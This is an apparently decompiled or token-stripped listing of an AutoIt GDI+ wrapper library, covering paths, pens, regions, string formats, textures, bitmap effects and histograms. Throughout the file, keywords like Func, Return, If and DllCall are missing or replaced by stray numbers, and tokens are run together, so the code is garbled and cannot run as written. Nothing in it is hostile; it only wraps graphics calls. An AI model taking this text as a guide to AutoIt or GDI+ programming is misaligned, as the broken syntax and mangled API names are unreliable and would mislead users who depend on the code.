$areturn[2]
$areturn[0] = $aresult[2]
$areturn[1] = $aresult[4]
$areturn

_gdiplus_pathiterrewind($hpathiter)
$aresult = ($__g_hgdipdll, "int", "GdipPathIterRewind", "handle", $hpathiter)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathreset($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipResetPath", "handle", $hpath)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathreverse($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipReversePath", "handle", $hpath)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathsetfillmode($hpath, $ifillmode)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathFillMode", "handle", $hpath, "int", $ifillmode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathsetmarker($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipSetPathMarker", "handle", $hpath)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathstartfigure($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipStartPathFigure", "handle", $hpath)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathtransform($hpath, $hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipTransformPath", "handle", $hpath, "handle", $hmatrix)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathwarp($hpath, $hmatrix, $apoints, $nx, $ny, $nwidth, $nheight, $iwarpmode = 0, $fflatness = 0.25)
$icount = $apoints[0][0]
$icount <> 31$icount <> 4534(11, 0, 40)
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], ($ii - 1) * 2 + 1)
($tpoints, 1, $apoints[$ii][1], ($ii - 1) * 2 + 2)

$aresult = ($__g_hgdipdll, "int", "GdipWarpPath", "handle", $hpath, "handle", $hmatrix, "struct*", $tpoints, "int", $icount, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "int", $iwarpmode, "float", $fflatness)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathwiden($hpath, $hpen, $hmatrix = 0, $fflatness = 0.25)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipWidenPath", "handle", $hpath, "handle", $hpen, "handle", $hmatrix, "float", $fflatness)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pathwindingmodeoutline($hpath, $hmatrix = 0, $fflatness = 0.25)
$aresult = ($__g_hgdipdll, "int", "GdipWindingModeOutline", "handle", $hpath, "handle", $hmatrix, "float", $fflatness)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pencreate($iargb = -16777216, $fwidth = 1, $iunit = 2)
$aresult = ($__g_hgdipdll, "int", "GdipCreatePen1", "dword", $iargb, "float", $fwidth, "int", $iunit, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[4]

_gdiplus_pencreate($hbrush, $fwidth = 1, $iunit = 2)
$aresult = ($__g_hgdipdll, "int", "GdipCreatePen2", "handle", $hbrush, "float", $fwidth, "int", $iunit, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[4]

_gdiplus_pendispose($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDeletePen", "handle", $hpen)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pengetalignment($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipGetPenMode", "handle", $hpen, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pengetcolor($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipGetPenColor", "handle", $hpen, "dword*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pengetcustomendcap($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipGetPenCustomEndCap", "handle", $hpen, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_pengetdashcap($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipGetPenDashCap197819", "handle", $hpen, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pengetdashstyle($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipGetPenDashStyle", "handle", $hpen, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pengetendcap($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipGetPenEndCap", "handle", $hpen, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pengetmiterlimit($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipGetPenMiterLimit", "handle", $hpen, "float*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pengetwidth($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipGetPenWidth", "handle", $hpen, "float*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_pensetalignment($hpen, $ialignment = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenMode", "handle", $hpen, "int", $ialignment)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetcolor($hpen, $iargb)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenColor", "handle", $hpen, "dword", $iargb)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetcustomendcap($hpen, $hendcap)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenCustomEndCap", "handle", $hpen, "handle", $hendcap)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetdashcap($hpen, $idash = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenDashCap197819", "handle", $hpen, "int", $idash)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetdashstyle($hpen, $istyle = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenDashStyle", "handle", $hpen, "int", $istyle)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetendcap($hpen, $iendcap)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenEndCap", "handle", $hpen, "int", $iendcap)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetlinecap($hpen, $istartcap, $iendcap, $idashcap)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenLineCap197819", "handle", $hpen, "int", $istartcap, "int", $iendcap, "int", $idashcap)
@error534(@error, @extended, 40)
$aresult[0]5(10, $aresult[0], 40)
9

_gdiplus_pensetlinejoin($hpen, $ilinejoin)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenLineJoin", "handle", $hpen, "int", $ilinejoin)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetmiterlimit($hpen, $fmiterlimit)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenMiterLimit", "handle", $hpen, "float", $fmiterlimit)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetstartcap($hpen, $ilinecap)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenStartCap", "handle", $hpen, "int", $ilinecap)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_pensetwidth($hpen, $fwidth)
$aresult = ($__g_hgdipdll, "int", "GdipSetPenWidth", "handle", $hpen, "float", $fwidth)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_rectfcreate($nx = 0, $ny = 0, $nwidth = 0, $nheight = 0)
$trectf = ($taggdiprectf)
($trectf, "X", $nx)
($trectf, "Y", $ny)
($trectf, "Width", $nwidth)
($trectf, "Height", $nheight)
$trectf

_gdiplus_regionclone($hregion)
$aresult = ($__g_hgdipdll, "int", "GdipCloneRegion", "handle", $hregion, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_regioncombinepath($hregion, $hpath, $icombinemode = 2)
$aresult = ($__g_hgdipdll, "int", "GdipCombineRegionPath", "handle", $hregion, "handle", $hpath, "int", $icombinemode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_regioncombinerect($hregion, $nx, $ny, $nwidth, $nheight, $icombinemode = 2)
$trectf = _gdiplus_rectfcreate($nx, $ny, $nwidth, $nheight)
$aresult = ($__g_hgdipdll, "int", "GdipCombineRegionRect", "handle", $hregion, "struct*", $trectf, "int", $icombinemode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_regioncombineregion($hregiondst, $hregionsrc, $icombinemode = 2)
$aresult = ($__g_hgdipdll, "int", "GdipCombineRegionRegion", "handle", $hregiondst, "handle", $hregionsrc, "int", $icombinemode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_regioncreate()
$aresult = ($__g_hgdipdll, "int", "GdipCreateRegion", "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[1]

_gdiplus_regioncreatefrompath($hpath)
$aresult = ($__g_hgdipdll, "int", "GdipCreateRegionPath", "handle", $hpath, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_regioncreatefromrect($nx, $ny, $nwidth, $nheight)
$trectf = _gdiplus_rectfcreate($nx, $ny, $nwidth, $nheight)
$aresult = ($__g_hgdipdll, "int", "GdipCreateRegionRect", "struct*", $trectf, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_regiondispose($hregion)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteRegion", "handle", $hregion)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_regiongetbounds($hregion, $hgraphics)
$trectf = ($taggdiprectf)
$aresult = ($__g_hgdipdll, "int", "GdipGetRegionBounds", "handle", $hregion, "handle", $hgraphics, "struct*", $trectf)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$abounds[4]
$ii = 1154
$abounds[$ii - 1] = ($trectf, $ii)

$abounds

_gdiplus_regiongethrgn($hregion, $hgraphics = 0)
$aresult = ($__g_hgdipdll, "int", "GdipGetRegionHRgn", "handle", $hregion, "handle", $hgraphics, "handle*", 0)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
$aresult[3]

_gdiplus_regiontransform($hregion, $hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipTransformRegion", "handle", $hregion, "handle", $hmatrix)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_regiontranslate($hregion, $ndx, $ndy)
$aresult = ($__g_hgdipdll, "int", "GdipTranslateRegion", "handle", $hregion, "float", $ndx, "float", $ndy)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_shutdown()
$__g_hgdipdll = 0534(-1, -1, 40)
$__g_igdipref -= 1
$__g_igdipref = 05
($__g_hgdipdll, "none", "GdiplusShutdown", "ulong_ptr", $__g_igdiptoken)
($__g_hgdipdll)
$__g_hgdipdll = 0

9

_gdiplus_startup($sgdipdll = 41, $bretdllhandle = 40)
$__g_igdipref += 1
$__g_igdipref > 153439
$sgdipdll = 415
@OSBuild > 49991@OSBuild < 76005
$sgdipdll = @WindowsDir & "\winsxs\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.6000.16386_none_8df21b8362744ace\gdiplus.dll"

$sgdipdll = "gdiplus.dll"


$__g_hgdipdll = ($sgdipdll)
$__g_hgdipdll = -15
$__g_igdipref = 0
(1, 2, 40)

$sver = ($sgdipdll)
$sver = ($sver, ".")
$sver[1] > 55$__g_bgdip_v1_0 = 40
$tinput = ($taggdipstartupinput)
$ttoken = ("ulong_ptr Data")
($tinput, "Version", 1)
$aresult = ($__g_hgdipdll, "int", "GdiplusStartup", "struct*", $ttoken, "struct*", $tinput, "ptr", 0)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
$__g_igdiptoken = ($ttoken, "Data")
$bretdllhandle534$__g_hgdipdll
9

_gdiplus_stringformatcreate($iformat = 0, $ilangid = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateStringFormat", "int", $iformat, "word", $ilangid, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_stringformatdispose($hformat)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteStringFormat", "handle", $hformat)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_stringformatgetmeasurablecharacterrangecount($hstringformat)
$aresult = ($__g_hgdipdll, "int", "GdipGetStringFormatMeasurableCharacterRangeCount", "handle", $hstringformat, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_stringformatsetalign($hstringformat, $iflag)
$aresult = ($__g_hgdipdll, "int", "GdipSetStringFormatAlign", "handle", $hstringformat, "int", $iflag)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_stringformatsetlinealign($hstringformat, $istringalign)
$aresult = ($__g_hgdipdll, "int", "GdipSetStringFormatLineAlign", "handle", $hstringformat, "int", $istringalign)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_stringformatsetmeasurablecharacterranges($hstringformat, $aranges)
$icount = $aranges[0][0]
$tcharacterranges = ("int[" & $icount * 2 & "]")
$ii = 115$icount
($tcharacterranges, 1, $aranges[$ii][0], (($ii - 1) * 2) + 1)
($tcharacterranges, 1, $aranges[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipSetStringFormatMeasurableCharacterRanges", "handle", $hstringformat, "int", $icount, "struct*", $tcharacterranges)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_texturecreate($himage, $iwrapmode = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateTexture", "handle", $himage, "int", $iwrapmode, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_texturecreate($himage, $nx, $ny, $nwidth, $nheight, $iwrapmode = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateTexture2", "handle", $himage, "int", $iwrapmode, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[7]

_gdiplus_texturecreateia($himage, $nx, $ny, $nwidth, $nheight, $pimageattributes = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateTextureIA", "handle", $himage, "handle", $pimageattributes, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "ptr*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[7]

__gdiplus_brushdefcreate(36$hbrush)
$hbrush = 05
$__g_hgdipbrush = _gdiplus_brushcreatesolid()
$hbrush = $__g_hgdipbrush


__gdiplus_brushdefdispose($icurerror = @error, $icurextended = @extended)
$__g_hgdipbrush <> 05
_gdiplus_brushdispose($__g_hgdipbrush)
$__g_hgdipbrush = 0

($icurerror, $icurextended)

__gdiplus_extractfileext($sfilename, $bnodot = 39)
$iindex = __gdiplus_lastdelimiter(".\:", $sfilename)
($iindex > 0)(($sfilename, $iindex, 1) = ".")5
$bnodot5
($sfilename, $iindex + 1)

($sfilename, $iindex)


""


__gdiplus_lastdelimiter($sdelimiters, $sstring)
$sdelimiter, $in
$ii = 115($sdelimiters)
$sdelimiter = ($sdelimiters, $ii, 1)
$in = ($sstring, $sdelimiter, 0, -1)
$in > 0534$in


__gdiplus_pendefcreate(36$hpen)
$hpen = 05
$__g_hgdippen = _gdiplus_pencreate()
$hpen = $__g_hgdippen


__gdiplus_pendefdispose($icurerror = @error, $icurextended = @extended)
$__g_hgdippen <> 05
_gdiplus_pendispose($__g_hgdippen)
$__g_hgdippen = 0

($icurerror, $icurextended)

__gdiplus_bitmapcreatedibfrombitmap($hbitmap)
$tbihdr, $aret, $tdata, $pbits, $hhbitmapv5 = 0
$aret = ($__g_hgdipdll, "uint", "GdipGetImageDimension", "handle", $hbitmap, "float*", 0, "float*", 0)
@error2$aret[0]5340
$tdata = _gdiplus_bitmaplockbits($hbitmap, 0, 0, $aret[2], $aret[3], $gdip_ilmread, $gdip_pxf32argb)
$pbits = ($tdata, "Scan0")
$pbits5340
$tbihdr = ($tagbitmapv5header)
($tbihdr, "bV5Size", ($tbihdr))
($tbihdr, "bV5Width", $aret[2])
($tbihdr, "bV5Height", $aret[3])
($tbihdr, "bV5Planes", 1)
($tbihdr, "bV5BitCount", 32)
($tbihdr, "bV5Compression", 0)
($tbihdr, "bV5SizeImage", $aret[3] * ($tdata, "Stride"))
($tbihdr, "bV5AlphaMask", -16777216)
($tbihdr, "bV5RedMask", 16711680)
($tbihdr, "bV5GreenMask", 65280)
($tbihdr, "bV5BlueMask", 255)
($tbihdr, "bV5CSType", 2)
($tbihdr, "bV5Intent", 4)
$hhbitmapv5 = ("gdi32.dll", "ptr", "CreateDIBSection", "hwnd", 0, "struct*", $tbihdr, "uint", 0, "ptr*", 0, "ptr", 0, "dword", 0)
@error1$hhbitmapv5[0]5
("gdi32.dll", "dword", "SetBitmapBits", "ptr", $hhbitmapv5[0], "dword", $aret[2] * $aret[3] * 4, "ptr", ($tdata, "Scan0"))
$hhbitmapv5 = $hhbitmapv5[0]

$hhbitmapv5 = 0

_gdiplus_bitmapunlockbits($hbitmap, $tdata)
$tdata = 0
$tbihdr = 0
$hhbitmapv5

_gdiplus_bitmapapplyeffect($hbitmap, $heffect, $trect = 42)
$__g_bgdip_v1_0534(-1, 0, 40)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapApplyEffect", "handle", $hbitmap, "handle", $heffect, "struct*", $trect, "int", 0, "ptr*", 0, "int*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_bitmapapplyeffectex($hbitmap, $heffect, $ix = 0, $iy = 0, $iw = 0, $ih = 0)
$__g_bgdip_v1_0534(-1, 0, 40)
$trect = 0
($ix, $iy, $iw, $ih)5
$trect = ("int Left; int Top; int Right; int Bottom;")
($trect, "Right", $iw + ($trect, "Left", $ix))
($trect, "Bottom", $ih + ($trect, "Top", $iy))

$istatus = _gdiplus_bitmapapplyeffect($hbitmap, $heffect, $trect)
$istatus534(@error, @extended, 40)
9

_gdiplus_bitmapconvertformat($hbitmap, $ipixelformat, $idithertype, $ipalettetype, $tpalette, $falphathresholdpercent = 0)
$__g_bgdip_v1_0534(-1, 0, 40)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapConvertFormat", "handle", $hbitmap, "uint", $ipixelformat, "uint", $idithertype, "uint", $ipalettetype, "struct*", $tpalette, "float", $falphathresholdpercent)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_bitmapcreateapplyeffect($hbitmap, $heffect, $trect = 42, $toutrect = 42)
$__g_bgdip_v1_0534(-1, 0, 0)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapCreateApplyEffect", "handle*", $hbitmap, "int", 1, "handle", $heffect, "struct*", $trect, "struct*", $toutrect, "handle*", 0, "int", 0, "ptr*", 0, "int*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[6]

_gdiplus_bitmapcreateapplyeffectex($hbitmap, $heffect, $ix = 0, $iy = 0, $iw = 0, $ih = 0)
$__g_bgdip_v1_0534(-1, 0, 0)
$trect = 0
($ix, $iy, $iw, $ih)5
$trect = ("int Left; int Top; int Right; int Bottom;")
($trect, "Right", $iw + ($trect, "Left", $ix))
($trect, "Bottom", $ih + ($trect, "Top", $iy))

$hbitmap_fx = _gdiplus_bitmapcreateapplyeffect($hbitmap, $heffect, $trect, 42)
(@error, @extended, $hbitmap_fx)

_gdiplus_bitmapgethistogram($hbitmap, $ihistogramformat, $ihistogramsize, $tchannel_0, $tchannel_1 = 0, $tchannel_2 = 0, $tchannel_3 = 0)
$__g_bgdip_v1_0534(-1, 0, 40)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapGetHistogram", "handle", $hbitmap, "uint", $ihistogramformat, "uint", $ihistogramsize, "struct*", $tchannel_0, "struct*", $tchannel_1, "struct*", $tchannel_2, "struct*", $tchannel_3)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_bitmapgethistogramex($hbitmap)
$__g_bgdip_v1_0534(-1, 0, 0)
$isize = _gdiplus_bitmapgethistogramsize($gdip_histogramformatargb)
$thistogram = ("int Size; uint Red[" & $isize & "]; uint MaxRed; uint Green[" & $isize & "]; uint MaxGreen; uint Blue[" & $isize & "]; uint MaxBlue; uint Alpha[" & $isize & "]; uint MaxAlpha; uint Grey[" & $isize & "]; uint MaxGrey;")
($thistogram, "Size", $isize)
$istatus = _gdiplus_bitmapgethistogram($hbitmap, $gdip_histogramformatargb, $isize, ($thistogram, "Alpha"), ($thistogram, "Red"), ($thistogram, "Green"), ($thistogram, "Blue"))
$istatus534(@error, @extended, 0)
$istatus = _gdiplus_bitmapgethistogram($hbitmap, $gdip_histogramformatgray, $isize, ($thistogram, "Grey"))
$istatus534(@error + 10, @extended, 0)
$imaxred = 0, $imaxgreen = 0, $imaxblue = 0, $imaxalpha = 0, $imaxgrey = 0
$i = 115$isize
($thistogram, "Red", $i) > $imaxred5$imaxred = ($thistogram, "Red", $i)
($thistogram, "Green", $i) > $imaxgreen5$imaxgreen = ($thistogram, "Green", $i)
($thistogram, "Blue", $i) > $imaxblue5$imaxblue = ($thistogram, "Blue", $i)
($thistogram, "Alpha", $i) > $imaxalpha5$imaxalpha = ($thistogram, "Alpha", $i)
($thistogram, "Grey", $i) > $imaxgrey5$imaxgrey = ($thistogram, "Grey", $i)

($thistogram, "MaxRed", $imaxred)
($thistogram, "MaxGreen", $imaxgreen)
($thistogram, "MaxBlue", $imaxblue)
($thistogram, "MaxAlpha", $imaxalpha)
($thistogram, "MaxGrey", $imaxgrey)
$thistogram

_gdiplus_bitmapgethistogramsize($iformat)
$__g_bgdip_v1_0534(-1, 0, 0)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapGetHistogramSize", "uint", $iformat, "uint*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_drawimagefx($hgraphics, $himage, $heffect, $trectf = 0, $hmatrix = 0, $himgattributes = 0, $iunit = 2)
$__g_bgdip_v1_0534(-1, 0, 40)
$aresult = ($__g_hgdipdll, "int", "GdipDrawImageFX", "handle", $hgraphics, "handle", $himage, "struct*", $trectf, "handle", $hmatrix, "handle", $heffect, "handle", $himgattributes, "uint", $iunit)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_drawimagefxex($hgraphics, $himage, $heffect, $nx = 0, $ny = 0, $nw = 0, $nh = 0, $hmatrix = 0, $himgattributes = 0, $iunit = 2)
$__g_bgdip_v1_0534(-1, 0, 40)
$trectf = 0
($nx, $ny, $nw, $nh)5$trectf = _gdiplus_rectfcreate($nx, $ny, $nw, $nh)
$istatus = _gdiplus_drawimagefx($hgraphics, $himage, $heffect, $trectf, $hmatrix, $himgattributes, $iunit)
(@error, @extended, $istatus)

_gdiplus_effectcreate($seffectguid)
$__g_bgdip_v1_0534(-1, 0, 0)
$tguid = _winapi_guidfromstring($seffectguid)
$telem = ("uint64[2];", ($tguid))
$aresult = ($__g_hgdipdll, "int", "GdipCreateEffect", "uint64", ($telem, 1, 1), "uint64", ($telem, 1, 2), "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_effectcreateblur($fradius = 10, $bexpandedge = 40)
$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_blur)
($teffectparameters, "Radius", $fradius)
($teffectparameters, "ExpandEdge", $bexpandedge)
$heffect = _gdiplus_effectcreate($gdip_blureffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatebrightnesscontrast($ibrightnesslevel = 0, $icontrastlevel = 0)
$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_brightnesscontrast)
($teffectparameters, "BrightnessLevel", $ibrightnesslevel)
($teffectparameters, "ContrastLevel", $icontrastlevel)
$heffect = _gdiplus_effectcreate($gdip_brightnesscontrasteffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatecolorbalance($icyanred = 0, $imagentagreen = 0, $iyellowblue = 0)
$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_colorbalance)
($teffectparameters, "CyanRed", $icyanred)
($teffectparameters, "MagentaGreen", $imagentagreen)
($teffectparameters, "YellowBlue", $iyellowblue)
$heffect = _gdiplus_effectcreate($gdip_colorbalanceeffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatecolorcurve($iadjustment, $ichannel, $iadjustvalue)
$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_colorcurve)
($teffectparameters, "Adjustment", $iadjustment)
($teffectparameters, "Channel", $ichannel)
($teffectparameters, "AdjustValue", $iadjustvalue)
$heffect = _gdiplus_effectcreate($gdip_colorcurveeffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatecolorlut($acolorlut)
$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_colorlut)
$ii = 015255
($teffectparameters, "LutA", $acolorlut[$ii][0], $ii + 1)
($teffectparameters, "LutR", $acolorlut[$ii][1], $ii + 1)
($teffectparameters, "LutG", $acolorlut[$ii][2], $ii + 1)
($teffectparameters, "LutB", $acolorlut[$ii][3], $ii + 1)

$heffect = _gdiplus_effectcreate($gdip_colorluteffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatecolormatrix($tcolormatrix)
$__g_bgdip_v1_0534(-1, 0, 0)
$heffect = _gdiplus_effectcreate($gdip_colormatrixeffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $tcolormatrix)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatehuesaturationlightness($ihuelevel = 0, $isaturationlevel = 0, $ilightnesslevel = 0)
$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_huesaturationlightness)
($teffectparameters, "HueLevel", $ihuelevel)
($teffectparameters, "SaturationLevel", $isaturationlevel)
($teffectparameters, "LightnessLevel", $ilightnesslevel)
$heffect = _gdiplus_effectcreate($gdip_huesaturationlightnesseffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatelevels($ihighlight = 100, $imidtone = 0, $ishadow = 0)
$__g_bgdip_v1_0534(-1, 0, 0)
$teffectparameters = ($taggdip_effectparams_levels)
($teffectparameters, "Highlight", $ihighlight)
($teffectparameters, "Midtone", $imidtone)
($teffectparameters, "Shadow", $ishadow)
$heffect = _gdiplus_effectcreate($gdip_levelseffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters)
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreateredeyecorrection($aareas)
$__g_bgdip_v1_0534(-1, 0, 0)
$icount = $aareas[0][0]
$tareas = ("long[" & $icount * 4 & "]")
$ii = 115$icount
($tareas, 1, ($tareas, 1, $aareas[$ii][0], (($ii - 1) * 4) + 1) + $aareas[$ii][2], (($ii - 1) * 4) + 3)
($tareas, 1, ($tareas, 1, $aareas[$ii][1], (($ii - 1) * 4) + 2) + $aareas[$ii][3], (($ii - 1) * 4) + 4)

$teffectparameters = ($taggdip_effectparams_redeyecorrection)
($teffectparameters, "NumberOfAreas", $icount)
($teffectparameters, "Areas", ($tareas))
$heffect = _gdiplus_effectcreate($gdip_redeyecorrectioneffectguid)
@error534(@error, @extended, 0)
_gdiplus_effectsetparameters($heffect, $teffectparameters, (($tareas) + ($teffectparameters)) / ($teffectparameters))
@error534(@error + 10, @extended, 0)
$heffect

_gdiplus_effectcreatesharpen($fradius = 10, $famount = 50)
